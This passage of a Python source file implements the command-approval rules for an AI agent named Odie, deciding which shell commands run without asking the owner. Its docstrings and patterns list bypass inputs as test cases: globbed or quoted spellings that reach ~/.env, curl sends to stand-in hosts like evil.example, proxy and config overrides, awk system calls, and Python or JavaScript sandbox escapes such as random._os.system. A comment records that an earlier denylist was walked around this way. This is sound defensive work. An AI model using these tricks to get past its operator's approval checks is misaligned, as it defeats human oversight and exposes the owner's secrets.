        else:
            path_ok = strictly_inside(_expanded(fixed, here))
        if not path_ok:
            return False
    return True


def is_local_npx(name: str, here: str) -> bool:
    """Whether `npx <name>` runs the project's own installed tool (node_modules/.bin/<name> where it runs, or a folder
    above), which installs nothing: `npx tsc` in a web/ with its node_modules -> True; `npx cowsay` with no such
    file -> False (npx would fetch it from the registry and run its scripts)."""
    folder = Path(here)
    for place in (folder, *folder.parents):
        if (place / "node_modules" / ".bin" / name).exists():
            return True
    return False


def ordinary_work_blanked(shell: str, scratch_dirs: tuple[str, ...], cwd: str | None) -> str:
    """The shell text with the plainly safe parts blanked, following its cd's: deleting scratch files
    (is_scratch_delete), the project's own npx tool (is_local_npx), uvx of a well-known tool and `uv run --with` of
    well-known packages (KNOWN_PY_TOOLS). The rules then read what's left.
    `cd /tmp && rm -rf pr12-review && ls` -> `cd /tmp &&                  && ls`;
    `uvx ruff check .` -> `     ruff check .`; `uvx cowsay hi` -> unchanged."""
    here = os.path.realpath(os.path.expanduser(cwd or "~"))
    out = list(shell)
    for start, end in segment_spans(shell):
        segment = shell[start:end]
        moved = _CD.match(segment)
        if moved:
            here = _expanded(moved.group(1), here)
            continue
        if is_scratch_delete(segment, here, scratch_dirs):
            out[start:end] = " " * (end - start)
            continue
        blank_from = []
        for npx in _NPX.finditer(segment):
            if is_local_npx(npx.group(1), here):
                blank_from.append((npx.start(), npx.start(1)))
        for uvx in _UVX.finditer(segment):
            if uvx.group(1) in KNOWN_PY_TOOLS:
                blank_from.append((uvx.start(), uvx.start(1)))
        withs = list(_UV_WITH.finditer(segment))
        if withs and all(w.group(1) in KNOWN_PY_TOOLS for w in withs):
            blank_from.extend((w.start(), w.end()) for w in withs)
        for a, b in blank_from:
            out[start + a:start + b] = " " * (b - a)
    return "".join(out)


def code_writes_stay_here(shell: str, code: str, safe_dirs: tuple[str, ...], cwd: str | None) -> bool:
    """Whether code fed to an interpreter (a heredoc) writes only where it runs, and it runs in a safe place (the
    workspace, the vault, /tmp): it names no absolute or home path, no `..`, no home(), environ or chdir.
    `cd <vault> && python3 - <<'PY'` with Path("3-Resources/Vocabulary.md").write_text(…) -> True;
    the same run from ~ -> False; with Path.home() / ".zshrc" -> False; no heredoc code -> False."""
    if not code.strip():
        return False
    here = os.path.realpath(os.path.expanduser(cwd or "~"))
    for segment in segments(shell):
        moved = _CD.match(segment)
        if moved:
            here = _expanded(moved.group(1), here)
    if not is_safe_place(here, safe_dirs):
        return False
    return _CODE_LEAVES_HERE.search(code) is None


def squeezed(text: str) -> str:
    """The text with the spelling tricks taken out, so a rule's word still matches: quotes and backslashes inside a word
    (`cat ~/."env"`, `cat ~/.\\env`), and one-character globs (`cat ~/.e?nv`, `cat ~/.en[v]`) that make the shell find
    the file the rule names. `cat ~/.e?nv` -> "cat ~/.env"; `ls ~/Downloads` -> unchanged."""
    words_not_separators = _ESCAPED_SEPARATOR.sub(" ", text)  # grep 'a\|source' must not become "|source"
    return _SQUEEZE.sub("", _ONE_OF.sub(r"\1", words_not_separators))


def hidden_path_by_pattern(shell: str, safe_dirs: tuple[str, ...] = ()) -> bool:
    """Whether the shell text reaches a hidden file or folder under the home folder by a pattern or a substitution the
    shell fills in at run time, so the rules can't read the real name. A pattern whose fixed part is already inside a
    safe place (Odie's workspace, under ~/.odie) is fine: it can only name files there.
    `cat ~/.{e,x}nv` -> True; `ls ~/.odie/*` -> True; `cat ~/.$(echo e)nv` -> True; `cd ~ && cat .o*e/x` -> True
    (a dot name with an unquoted pattern in it, anywhere); `find . -name '.*.swp'` -> False (quoted: find's words); `cat ~/.agentd/profiles/x/SKILL.md`
    -> False (a plain name, judged by the rules); `ls ~/Downloads/*.pdf` -> False (not hidden);
    `ls ~/.odie/workspace/*.md` with the workspace safe -> False; `ls $HOME/.odie/workspace` -> False ($HOME is the home,
    not a pattern: only the part after it is read)."""
    home = os.path.realpath(os.path.expanduser("~"))
    contexts = char_contexts(shell)
    for dot_glob in _DOT_GLOB.finditer(shell):
        if contexts[dot_glob.end() - 1] == "plain":
            return True  # `cd ~ && cat .od?e/mcp.json`: a hidden name spelled by a pattern, wherever it starts
    for path in _HIDDEN_PATH.finditer(shell):
        text = path.group(0)
        prefix = len(path.group(1))  # ~, $HOME, ${HOME}, /Users/x: the home itself, however it is spelled
        pattern = _GLOBBED.search(text, prefix)
        if pattern is None:
            continue
        fixed_part = text[:pattern.start()]
        if is_safe_place(_expanded(fixed_part, home), safe_dirs):
            continue
        return True
    return False


# ── Smart mode asks only for what matters (17 Nov 2026) ─────────────────────────────────────────────────────────────
# The owner: "Only in case of something like a delete or destructive action, it asks me ... If it has to post with a
# webhook or an API, that's fine to ask." 57 cards in a day, most for reading Odie's own code, formatting JSON with
# python3 -c, find's -prune, reading a LaunchAgent, posting to a server on this Mac, and writing a new note. These read
# such commands plainly in Smart only: each one decides on the shell's own words (shlex), and anything it can't read
# plainly ($ but $HOME, `, a glob, a brace, ( ) < >, a backslash outside quotes, ~- or ~+) is left to the rules.

def char_contexts(text: str) -> list[str]:
    """How the shell reads each character: "plain", "single" (inside '…'), "double" (inside "…", where $ and ` still
    work), "escaped" (right after a backslash outside quotes) or "quote" (a quote mark itself).
    `a'b'"$c"` -> plain, quote, single, quote, quote, double, double, quote."""
    out = []
    state = "plain"
    escaped = False
    for char in text:
        if state == "single":
            if char == "'":
                out.append("quote")
                state = "plain"
            else:
                out.append("single")
        elif state == "double":
            if escaped:
                escaped = False
                out.append("double")
            elif char == "\\":
                escaped = True
                out.append("double")
            elif char == '"':
                out.append("quote")
                state = "plain"
            else:
                out.append("double")
        elif escaped:
            escaped = False
            out.append("escaped")
        elif char == "\\":
            escaped = True
            out.append("plain")
        elif char in "'\"":
            out.append("quote")
            state = "single" if char == "'" else "double"
        else:
            out.append("plain")
    return out


# Where one simple command ends: ; && || | & and line ends (but not the & of 2>&1 or &>, nor the | of >|).
_PIECE_CUT = re.compile(r"&&|\|\||;|\n|(?<!>)\||(?<![>&|])&(?![>&])")


def piece_spans(shell: str) -> list[tuple[int, int]]:
    """Where each simple command of the shell text starts and ends: the text cut at ; && || | & and line ends outside
    quotes. "cd x; grep a f | head" -> [(0, 4), (5, 15), (16, 21)]."""
    contexts = char_contexts(shell)
    out = []
    start = 0
    for cut in _PIECE_CUT.finditer(shell):
        if contexts[cut.start()] != "plain":
            continue
        out.append((start, cut.start()))
        start = cut.end()
    out.append((start, len(shell)))
    return out


# A redirect that writes no file: into /dev/null, or one stream into another.
_HARMLESS_REDIRECT = re.compile(r"(\d*|&)>>?\s*/dev/null(?![^\s;&|<>])|\d*>&\d+(?![^\s;&|<>])")
_HOME_VARIABLE = re.compile(r"\$(HOME|\{HOME\}|ODIE_HOME|\{ODIE_HOME\})(?![\w}])")


def plain_words(piece: str, globs: bool = False) -> list[str] | None:
    """The words of one simple command when the shell reads it as plain text, or None when it doesn't. Plain: no $ but
    $HOME (and $ODIE_HOME), no `, no glob or brace, no ( ) < > or & outside quotes, no backslash outside quotes, no
    word starting ~- or ~+ or ~name; a redirect only into /dev/null or another stream.
      `grep -n "base_url" web/a.tsx 2>/dev/null` -> ["grep", "-n", "base_url", "web/a.tsx"];  `cat $X` -> None;
      `cat .*/x` -> None;  `grep x f > out.txt` -> None;  `cat ~-/x` -> None;  `awk '{print $1}' f` -> the words.
    `globs`: an unquoted * or ? is kept, marked as _ANY_RUN / _ANY_ONE, for rule 1 to judge (glob_stays_plain):
      `cat app/*.py` -> ["cat", "app/\x00.py"]; brackets, braces and ( ) still -> None."""
    contexts = char_contexts(piece)
    text = list(piece)
    for redirect in _HARMLESS_REDIRECT.finditer(piece):
        if contexts[redirect.start()] == "plain":
            text[redirect.start():redirect.end()] = " " * (redirect.end() - redirect.start())
    blanked = "".join(text)
    for i, char in enumerate(blanked):
        context = contexts[i]
        if context in ("plain", "double") and char == "`":
            return None
        if context in ("plain", "double") and char == "$" and not _HOME_VARIABLE.match(blanked, i):
            return None
        if globs and context == "plain" and char in "*?":
            text[i] = _ANY_RUN if char == "*" else _ANY_ONE
            continue
        if context == "plain" and char in "*?[]{}()<>&\\":
            return None
    try:
        words = shlex.split("".join(text))
    except ValueError:
        return None
    for word in words:
        if word.startswith("~") and word != "~" and not word.startswith("~/"):
            return None
    return words


_READERS = frozenset({"cd", "ls", "cat", "head", "tail", "wc", "stat", "file", "grep", "egrep", "fgrep", "rg", "sed",
                      "find", "git", "echo", "sort", "uniq", "cut", "tr", "awk", "pwd", "nl", "basename", "dirname"})
# An option that names a program to run (rg --pre, rg --hostname-bin, git --ext-diff, a pager or an editor).
_RUNS_A_PROGRAM = re.compile(r"^--pre$|bin|cmd|command|program|exec|pager|editor|hook|filter|textconv|ext-diff")
_FIND_ACTIONS = frozenset({"-delete", "-exec", "-execdir", "-ok", "-okdir", "-fprint", "-fprint0", "-fprintf", "-fls"})
_GIT_READS = frozenset({"log", "status", "diff", "show", "branch"})
_GIT_BRANCH_LISTS = frozenset({"-a", "-r", "-v", "-vv", "--all", "--remotes", "--list", "-l", "--show-current", "--verbose"})
# sed -n with line numbers or one /pattern/, ending in p: 100,175p, $p, /def /p, 10,/^}/p (several joined by ;)
_SED_PRINT = re.compile(r"((\d+|\$|/[^/\\]*/)(,(\d+|\$|/[^/\\]*/))?p)(;(\d+|\$|/[^/\\]*/)(,(\d+|\$|/[^/\\]*/))?p)*")
_AWK_RUNS_OR_WRITES = re.compile(r"system|getline|ENVIRON|close|fflush|[|>@]")


def plain_sed(args: list[str]) -> bool:
    """Whether a sed only prints lines: -n, with -E or -r allowed, and one script of line numbers or /patterns/ ending
    in p (no w, e or s). ["-n", "100,175p", "a.py"] -> True; ["-n", "/def /p", "a.py"] -> True;
    ["-n", "1w /tmp/x", "a.py"] -> False; ["-i", "", "s/a/b/", "a"] -> False; ["1,5p", "a"] -> False (no -n)."""
    flags = [a for a in args if a.startswith("-")]
    rest = [a for a in args if not a.startswith("-")]
    if "-n" not in flags or any(f not in ("-n", "-E", "-r") for f in flags):
        return False
    return bool(rest) and _SED_PRINT.fullmatch(rest[0]) is not None


def plain_git(args: list[str]) -> bool:
    """Whether a git command only reads: log, status, diff or show (never --output, which writes a file), or a bare
    `git branch` that lists. ["log", "--oneline", "-5"] -> True; ["diff", "--output=/tmp/x"] -> False;
    ["branch", "-a"] -> True; ["branch", "-D", "main"] -> False; ["-c", "core.pager=less", "log"] -> False."""
    if not args or args[0] not in _GIT_READS:
        return False
    if any(a.startswith("--output") for a in args):
        return False
    if args[0] == "branch":
        return all(a in _GIT_BRANCH_LISTS for a in args[1:])
    return True


def plain_awk(args: list[str]) -> bool:
    """Whether an awk only reads and prints: -F and -v allowed, no other option (-f reads a program we can't see), and
    a program with no system, getline, ENVIRON, pipe, redirect or @load. ["/def /{print NR}", "a.py"] -> True;
    ["-F:", "{print $1}", "f"] -> True; ["BEGIN{system(\"id\")}"] -> False; ["{print > \"out\"}", "f"] -> False;
    ["-f", "prog.awk"] -> False."""
    i = 0
    while i < len(args) and args[i].startswith("-"):
        option = args[i]
        if option in ("-F", "-v"):
            i += 2
            continue
        if option.startswith(("-F", "-v")):
            i += 1
            continue
        return False
    if i >= len(args):
        return False
    return _AWK_RUNS_OR_WRITES.search(args[i]) is None


def plain_sort(args: list[str]) -> bool:
    """Whether a sort only prints: no -o / --output (writes a file) and no --compress-program (runs one).
    ["-h"] -> True; ["-o", "a.py", "a.py"] -> False; ["-ro", "x"] -> False; ["--output=x"] -> False."""
    for a in args:
        if a.startswith(("--output", "--compress-program")):
            return False
        if a.startswith("-") and not a.startswith("--") and "o" in a:
            return False
    return True


def is_plain_reader(words: list[str]) -> bool:
    """Whether one simple command only reads and prints (cd, ls, cat, head, tail, wc, stat, file, grep family, echo,
    sort, uniq, cut, tr, awk, sed -n, find, git log/status/diff/show/branch, pwd, nl, basename, dirname), with each
    tool's ways of writing or running something refused. An empty command (a blank) counts as one.
      ["grep", "-n", "x", "a.py"] -> True;  ["sed", "-n", "100,175p", "a.py"] -> True;  ["find", ".", "-delete"] ->
      False;  ["rg", "--hostname-bin=./x", "y"] -> False (an option naming a program);  ["rg", "--pre", "./x", "y"] -> False;  ["uniq", "a", "b"] -> False (writes b);  ["rm", "x"] -> False;
      ["FOO=1", "cat", "x"] -> False."""
    if not words:
        return True
    tool = words[0]
    args = words[1:]
    if tool not in _READERS:
        return False
    if any(_RUNS_A_PROGRAM.search(a.split("=", 1)[0]) for a in args if a.startswith("-")):
        return False
    if tool == "sed":
        return plain_sed(args)
    if tool == "git":
        return plain_git(args)
    if tool == "awk":
        return plain_awk(args)
    if tool == "sort":
        return plain_sort(args)
    if tool == "find":
        return not any(a in _FIND_ACTIONS for a in args)
    if tool == "uniq":
        return len([a for a in args if not a.startswith("-")]) <= 1
    if tool == "rg":
        return not any(a.startswith("--pre") and not a.startswith("--pre-glob") for a in args)
    if tool == "file":
        return not any(a in ("-C", "--compile") for a in args)
    return True


def is_login_reader(words: list[str]) -> bool:
    """Smart's rule 4: whether one simple command only reads what runs later or at login: `launchctl list` or
    `launchctl print`, `crontab -l`, `plutil -p`, or any plain reader (is_plain_reader) naming a LaunchAgent.
      ["launchctl", "list"] -> True;  ["crontab", "-l"] -> True;  ["plutil", "-p", "x.plist"] -> True;
      ["launchctl", "bootout", "gui/501/x"] -> False;  ["crontab", "-r"] -> False;  ["plutil", "-convert", "xml1",
      "x.plist"] -> False;  ["plutil", "-p", "x.plist", "-o", "y"] -> False;  ["cp", "x.plist",
      "~/Library/LaunchAgents/"] -> False;  ["cd", "~/Library/LaunchAgents"] -> False (never blanked)."""
    if not words:
        return True
    tool = words[0]
    args = words[1:]
    if tool == "launchctl":
        return bool(args) and args[0] in ("list", "print")
    if tool == "crontab":
        return args == ["-l"]
    if tool == "plutil":
        return len(args) >= 2 and args[0] == "-p" and not any(a.startswith("-") for a in args[1:])
    if tool in _FOLDER_MOVES:
        return False  # a cd is never blanked: what runs after it is judged in that folder
    return is_plain_reader(words)


_LOCAL_HOSTS = frozenset({"localhost", "127.0.0.1", "::1", "0.0.0.0"})
_DEFAULT_PORT = {"http": 80, "https": 443}
# Ports on this computer that reach Odie's own API: its own (passed in), and Vite's preview and dev servers, which
# hand /api on to it.
_ODIE_FRONT_PORTS = frozenset({4173, 5173})
# Odie's API, wherever it answers (its port, a Vite dev or preview server on another one): a send to any /api/ path on
# this computer asks.
_ODIE_API_PATH = "/api"
# The curl and wget options a send to this computer may use, so the whole command is read exactly: an option not
# listed (a proxy, a resolver, a redirect followed, a config file, a variable expanded into the address …) means the
# command can't be read exactly, and it asks.
_CURL_FLAGS = frozenset({"-s", "--silent", "-S", "--show-error", "-f", "--fail", "--fail-with-body", "-i", "--include",
                         "-v", "--verbose", "-k", "--insecure", "--compressed", "-g", "--globoff", "-N", "--no-buffer",
                         "-4", "-6", "--http1.1", "--http2", "-I", "--head", "-G", "--get", "--no-progress-meter",
                         "-O", "--remote-name", "-J", "--remote-header-name"})
_CURL_VALUES = frozenset({"-d", "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode", "--json",
                          "-H", "--header", "-X", "--request", "-o", "--output", "-F", "--form", "--form-string",
                          "-u", "--user", "-A", "--user-agent", "-e", "--referer", "-b", "--cookie", "-c",
                          "--cookie-jar", "-m", "--max-time", "--connect-timeout", "-w", "--write-out", "-T",
                          "--upload-file", "-r", "--range", "-D", "--dump-header", "--retry", "--retry-delay",
                          "--retry-max-time", "--limit-rate", "--max-filesize", "-C", "--continue-at", "--output-dir",
                          "--oauth2-bearer", "--cacert", "-E", "--cert", "--key", "-Y", "-y", "-z", "--stderr"})
_CURL_FLAG_LETTERS = "sSfivkgN46IGOJ"
_CURL_VALUE_LETTERS = "dHXoFuAebcmwTrDCEYyz"
_WGET_FLAGS = frozenset({"-q", "--quiet", "-v", "--verbose", "-nv", "--no-verbose", "-S", "--server-response",
                         "--no-check-certificate", "-c", "--continue", "-N", "--timestamping", "-nc", "--no-clobber",
                         "--spider", "-4", "-6", "--inet4-only", "--inet6-only", "-nd", "--content-on-error"})
_WGET_VALUES = frozenset({"-O", "--output-document", "-o", "--output-file", "-a", "-P", "--directory-prefix", "-U",
                          "--user-agent", "-t", "--tries", "-T", "--timeout", "-w", "--wait", "-Q", "--header",
                          "--post-data", "--post-file", "--body-data", "--body-file", "--method", "--referer"})
_WGET_FLAG_LETTERS = "qvScN46"
_WGET_VALUE_LETTERS = "OoaPUtTwQ"


def is_local_address(word: str, own_port: int | None) -> bool:
    """Whether an address curl or wget is given is this computer (localhost, 127.0.0.1, [::1] or 0.0.0.0), and not
    Odie's own API: not its port, not Vite's 4173 or 5173 (they pass /api on to it), and on any port no /api path (read
    after decoding %xx, // and .., case ignored). Anything built at run time, curl's own {braces}
    or [ranges], a user@ part, a % left in the path, or a host that merely starts like one, is not.
      "http://localhost:9000/x" -> True;  "localhost:9000/x" -> True (curl adds http://);  "http://[::1]:9000/" -> True;
      "http://localhost.evil.example/" -> False;  "http://localhost@evil.example/" -> False;
      "http://{localhost,evil.example}/" -> False;  "http://localhost:8000/" with Odie on 8000 -> False;
      "http://localhost:5173/x" -> False;  "http://localhost:9000/api/approvals/5/decide" -> False;
      "http://localhost:5174/API/chat" -> False;  "http://localhost:9000/api;x/approvals" -> False."""
    rest = word.replace("[::1]", "", 1)
    if re.search(r"[\[\]{}*?$`\\\s@]", rest):
        return False
    address = word
    if "://" not in address:
        address = "http://" + address
    parts = urlsplit(address)
    if parts.scheme.lower() not in _DEFAULT_PORT:
        return False
    if parts.hostname not in _LOCAL_HOSTS:
        return False
    try:
        port = parts.port
    except ValueError:
        return False
    if port is None:
        port = _DEFAULT_PORT[parts.scheme.lower()]
    if port == own_port or port in _ODIE_FRONT_PORTS:
        return False
    path = unquote(parts.path)
    if "%" in path:
        return False  # encoded twice: can't say where it lands
    path = posixpath.normpath(re.sub(r"/+", "/", "/" + path)).lower()  # //api/x and /x/../api are /api/…
    return not path.startswith(_ODIE_API_PATH)  # /api/x, and /api;x/… or /apix too: when unsure, it asks


def _addresses(args: list[str], flags: frozenset[str], values: frozenset[str], flag_letters: str,
               value_letters: str) -> list[str] | None:
    """The addresses a curl or wget command is given, read exactly, or None when any option isn't one this reading
    knows (flags, values; joined short letters too): a send to this computer is free only when it can be read whole.
      ["-s", "-X", "POST", "http://localhost/x", "-d", "{}"] -> ["http://localhost/x"];
      ["-sLX", "POST", "http://localhost/"] -> None (L: a redirect followed elsewhere);
      ["--dns-servers", "1.2.3.4", "http://localhost/"] -> None;  ["--url", "http://localhost/"] -> [that]."""
    addresses = []
    at = 0
    while at < len(args):
        word = args[at]
        at += 1
        if word == "--url" and at < len(args):
            addresses.append(args[at])
            at += 1
            continue
        if not word.startswith("-") or word == "-":
            addresses.append(word)
            continue
        name = word.split("=", 1)[0]
        if name in flags:
            continue
        if name in values:
            if "=" not in word:
                at += 1  # its value is the next word
            continue
        if word.startswith("--"):
            return None
        for index, letter in enumerate(word[1:], start=1):
            if letter in flag_letters:
                continue
            if letter in value_letters:
                if index == len(word) - 1:
                    at += 1
                break  # the rest of the word, or the next one, is its value
            return None
    return addresses


def is_local_send(words: list[str], own_port: int | None) -> bool:
    """Smart's rule 5: whether one simple command is curl or wget sending only to this computer (is_local_address),
    read exactly (_addresses): at least one address and every one local.
      ["curl", "-s", "-X", "POST", "http://localhost:9000/x", "-d", "{}"] -> True;
      ["curl", "-X", "POST", "https://example.com/hook", "-d", "1"] -> False;
      ["curl", "-x", "http://p.example:8080", "-X", "POST", "http://localhost/"] -> False (a proxy);
      ["curl", "-X", "POST", "http://localhost/", "http://evil.example/"] -> False;  ["X=1", "curl", ...] -> False;
      ["wget", "--config=w", "--post-file=a", "http://localhost:9000/"] -> False."""
    if not words or words[0] not in ("curl", "wget"):
        return False
    if words[0] == "curl":
        addresses = _addresses(words[1:], _CURL_FLAGS, _CURL_VALUES, _CURL_FLAG_LETTERS, _CURL_VALUE_LETTERS)
    else:
        addresses = _addresses(words[1:], _WGET_FLAGS, _WGET_VALUES, _WGET_FLAG_LETTERS, _WGET_VALUE_LETTERS)
    if not addresses:
        return False
    return all(is_local_address(a, own_port) for a in addresses)


# What makes a whole command unfit for a free local send or piped program: it sets a variable (a proxy, CURL_HOME,
# WGETRC, PYTHONINSPECT, NODE_OPTIONS …) or names a curl or wget config, which could send it elsewhere or run code.
# Read as whole words, as written and with quotes and backslashes taken out (ex''port, "export", e\xport all export), so
# no wrapper hides it: builtin export, noglob export, inside if/for, after ! or ||. zsh's other ways count too:
# setopt allexport (then any assignment exports), ${X:=v}, read, print -v / printf -v, getopts, zparseopts, vared, let.
_SETS_A_VARIABLE = re.compile(
    r"(?<![\w./-])(export|typeset|declare|local|readonly|integer|float|env|setenv|unset|setopt|unsetopt|emulate|read|"
    r"getopts|zparseopts|vared|let)(?![\w./-])|"
    r"(?<![\w./-])set\s+[-+]|(?<![\w./-])(print|printf)\s+(-\w+\s+)*-\w*v|\$\{[^}]*=|"
    r"(?<![\w./=:@?-])[A-Za-z_]\w*\+?=")
_NAMES_A_CONFIG = re.compile(r"curlrc|wgetrc|CURL_HOME|WGETRC|XDG_CONFIG_HOME|--config\b|(^|\s)-K", re.IGNORECASE)
# Variables that change where curl and wget send, or what python and node load and run. Named anywhere in the command,
# in any case and however spelled, they keep both loosenings off: set some other way, they would still apply.
_CHANGES_HOW_TOOLS_RUN = re.compile(
    r"\w*_proxy\b|\bsocks\w*|\bcurl_\w+|\bwgetrc\b|\bssl_cert_\w+|\w*ca_bundle\b|\bpython[a-z_]+|\bnode_[a-z_]+|"
    r"\bld_\w+|\bdyld_\w+", re.IGNORECASE)


def sets_variables(shell: str) -> bool:
    """Whether the command sets a variable anywhere, however wrapped or spelled (export, typeset, declare, local,
    readonly, env, setopt, set with an option, ${X:=v}, read, print -v, a NAME=value word …), read both outside quotes
    and with quotes and backslashes squeezed out (the quoted program a pipe feeds is left out of the squeezed reading);
    or names a curl or wget config; or names a variable that changes how curl, wget, python or node run
    (_CHANGES_HOW_TOOLS_RUN). Then a send it makes, or a program it runs, may not do what its words say.
      `export ALL_PROXY=…; curl …` -> True;  `ex''port "ALL_PROXY=…"; curl …` -> True;  `e\\xport X=1` -> True;
      `setopt allexport; : ${X::=1}; curl …` -> True;  `X=1 curl …` -> True;  `echo $all_proxy; curl …` -> True;
      `curl -d a=1 http://localhost:9000/` -> True (a NAME= word: fail closed);  `curl -d '{}' http://localhost:9000/`
      -> False;  `… | python3 -c 'import json; d=json.load(…)'` -> False (the quoted program)."""
    if _NAMES_A_CONFIG.search(shell) or _CHANGES_HOW_TOOLS_RUN.search(squeezed(shell)):
        return True
    contexts = char_contexts(shell)
    unquoted = "".join(char if contexts[i] == "plain" else " " for i, char in enumerate(shell))
    spelled = squeezed(_without_piped_programs(shell))
    return _SETS_A_VARIABLE.search(unquoted) is not None or _SETS_A_VARIABLE.search(spelled) is not None


def _without_piped_programs(shell: str) -> str:
    """The shell text with the quoted program of each pipe into python3 -c / node -e blanked: its own `d = …` is the
    program's, not the shell's. `curl u | python3 -c 'd=1'` -> `curl u | python3 -c      `."""
    out = list(shell)
    for pipe in _PIPE_INTO_PROGRAM.finditer(shell):
        group = 1 if pipe.group(1) is not None else 2
        out[pipe.start(group):pipe.end(group)] = " " * (pipe.end(group) - pipe.start(group))
    return "".join(out)


# A pipe into python3 -c / node -e whose program is written right there, in one quoted word (double quotes only when
# nothing in it is filled in by the shell), and for node nothing after it (node would read later options, like -i).
_PIPE_INTO_PROGRAM = re.compile(
    r"\|\s*(?:python3?\s+-c\s+('[^']*'|\"[^\"$`\\]*\")(?=\s|$|[;&|)])"
    r"|node\s+-[ep]\s+('[^']*'|\"[^\"$`\\]*\")(?=\s*(?:$|[;&|\n])))")
# A pipe into python3 or node whose program is a heredoc with a quoted end word (so the shell fills nothing in).
_PIPE_INTO_HEREDOC = re.compile(r"\|\s*(python3?|node)\s+(?:-\s+)?<<-?\s*(['\"])\w+\2")

# What a piped program may be (17 Nov 2026 review: a list of what it may not do was walked around by
# random._os.system and attrgetter("sy"+"stem")). Python: these modules, and of each only these names.
PLAIN_PY_NAMES: dict[str, frozenset[str]] = {
    "json": frozenset({"load", "loads", "dump", "dumps", "JSONDecodeError"}),
    "sys": frozenset({"stdin", "stdout", "stderr", "argv", "exit"}),
    "re": frozenset({"compile", "match", "search", "fullmatch", "findall", "finditer", "sub", "subn", "split", "escape",
                     "IGNORECASE", "I", "MULTILINE", "M", "DOTALL", "S", "VERBOSE", "X"}),
    "csv": frozenset({"reader", "writer", "DictReader", "DictWriter", "excel", "excel_tab", "QUOTE_ALL",
                      "QUOTE_MINIMAL", "QUOTE_NONE", "QUOTE_NONNUMERIC"}),
}
_PY_IMPORT = re.compile(r"\bimport\b\s*([^;\n]+)|\bfrom\b\s*(\S+)\s+import\b\s*([^;\n]+)")
# Ways any program could reach past what it shows: a name or attribute starting with _, a call on a computed member
# (x[...](…)), text joined into a key, a name looked up from text, and (per language) its other doors.
_NEVER_IN_A_PLAIN_PROGRAM = re.compile(
    r"(?<![A-Za-z0-9])_|\]\s*\(|\[\s*['\"`][^\]]*\+|\b(eval|exec|getattr|setattr|globals|vars|constructor)\b")
_NEVER_IN_PLAIN_PYTHON = re.compile(
    r"\w*_hook\b|\bparse_(float|int|constant)\b|\b(execfile|delattr|locals|breakpoint|help|attrgetter|methodcaller|f_globals|f_builtins|f_locals|f_back|"
    r"tb_frame|tb_next|gi_frame|cr_frame|ag_frame|exc_info|modules|cls)\b|(?<![\w.])compile\b|\bfile\s*=")
_NEVER_IN_PLAIN_NODE = re.compile(
    r"\b(globalThis|global|this|Function|prototype|Reflect|Proxy|module|import|vm|child_process|fetch|WebSocket|"
    r"XMLHttpRequest|callee|caller|with)\b|"
    r"\[|\bObject\s*\.|\beval\b|"  # any [ at all: fs[k], {[k]: w}, ([n, f]) => …; Object.entries(fs)
    r"\.(call|apply|bind)\s*\(")
_PY_OPEN = re.compile(r"\bopen\s*\(")
_PY_PLAIN_OPEN = re.compile(r"\bopen\s*\(\s*(['\"])[\w./ -]*\1\s*\)")  # a file named right there, read, never written
# A name given another name (m = sys, f = o.system): after that the allowlist can't follow what it is.
_PY_BARE_ASSIGNMENT = re.compile(r"(?<![=!<>])=\s*[A-Za-z_][\w.]*\s*(;|,|\n|$)")
_PY_RUNNERS_UNCALLED = re.compile(r"\.(system|popen|exec\w*|spawn\w*)\b(?!\s*\()")
_JS_REQUIRE = re.compile(r"\brequire\b")
_JS_PLAIN_REQUIRE = re.compile(r"\brequire\s*\(\s*(['\"])(fs|node:fs)\1\s*\)")
# fs calls that write, copy, move, remove, open or watch; process.stdout.write is the one plain write.
_JS_CHANGES_FILES = re.compile(
    r"\b(write\w*|append\w*|copy\w*|cp\w*|rename\w*|unlink\w*|rm\w*|mkdir\w*|mkdtemp\w*|symlink\w*|link\w*|chmod\w*|"
    r"lchmod\w*|chown\w*|lchown\w*|truncate\w*|open\w*|create\w*|utimes\w*|lutimes\w*|futimes\w*|fchmod\w*|fchown\w*|"
    r"fsync\w*|fdatasync\w*|ftruncate\w*|watch\w*)\b")
_JS_PROCESS = re.compile(r"\bprocess\b(?!\.(stdin|stdout|argv|exit|exitCode)\b)")


def plain_program(program: str, language: str) -> bool:
    """Whether a program written in the command (`language` "python" or "node") is one of the plain ones a pipe may
    feed: it reads what comes in, works on it and prints. Python: imports only json, sys, re and csv, uses only their
    names in PLAIN_PY_NAMES, opens files only to read them. Node: requires only fs and calls none of its writes, uses
    of process only stdin, stdout, argv and exit. Neither may use a name starting with _, look a name up from text,
    call a computed member, or name eval, exec, getattr, globals, a constructor, frames (Python), globalThis, this,
    Function, import (node) and the like (_NEVER_IN_A_PLAIN_PROGRAM and the two lists after it).
      "import json,sys; print(json.load(sys.stdin))" -> True;  "import random,sys; random._os.system(…)" -> False;
      "import operator; operator.attrgetter('sy'+'stem')" -> False;  "import json; json.os" -> False;
      node "console.log(JSON.parse(require('fs').readFileSync(0,'utf8')))" -> True;
      node "globalThis['ev'+'al'](…)" -> False;  node "require('fs').copyFileSync(a, b)" -> False."""
    if _NEVER_IN_A_PLAIN_PROGRAM.search(program):
        return False
    if language == "python":
        return _NEVER_IN_PLAIN_PYTHON.search(program) is None and _plain_python(program)
    return _NEVER_IN_PLAIN_NODE.search(program) is None and _plain_node(program)


def _plain_python(program: str) -> bool:
    """plain_program's Python half: every import a whole module from PLAIN_PY_NAMES (no `as`, no dotted name) or
    named parts of one; each module named only as module.name with the name on its list (never bare, never renamed);
    no name given another bare name (f = o.system); every open() a read of a file named right there.
      "import json, sys" -> True;  "import json as j" -> False;  "from json import loads" -> True;
      "from os import system" -> False;  "import re; re.compile('a')" -> True;  "open('a.txt', 'w')" -> False;
      "import sys; m=sys" -> False;  "f=sys.exit; f(1)" -> False;  "p=sys.stdin.read(); open(p)" -> False."""
    imported = set()
    for found in _PY_IMPORT.finditer(program):
        if found.group(2) is not None:
            module = found.group(2)
            names = [n.strip() for n in found.group(3).split(",")]
            allowed = PLAIN_PY_NAMES.get(module)
            if allowed is None or any(n not in allowed for n in names):
                return False
            continue
        for part in found.group(1).split(","):
            name = part.strip()
            if name not in PLAIN_PY_NAMES:
                return False  # not on the list, dotted, or `as` another name
            imported.add(name)
    without_imports = _PY_IMPORT.sub(" ", program)
    for module in imported:
        for used in re.finditer(rf"\b{module}\b(\s*\.\s*(\w+))?", without_imports):
            if used.group(2) not in PLAIN_PY_NAMES[module]:
                return False  # the module bare (m = sys) or a name not on its list
    if _PY_BARE_ASSIGNMENT.search(program) or _PY_RUNNERS_UNCALLED.search(program):
        return False
    opens = len(_PY_OPEN.findall(program))
    return opens == len(_PY_PLAIN_OPEN.findall(program))


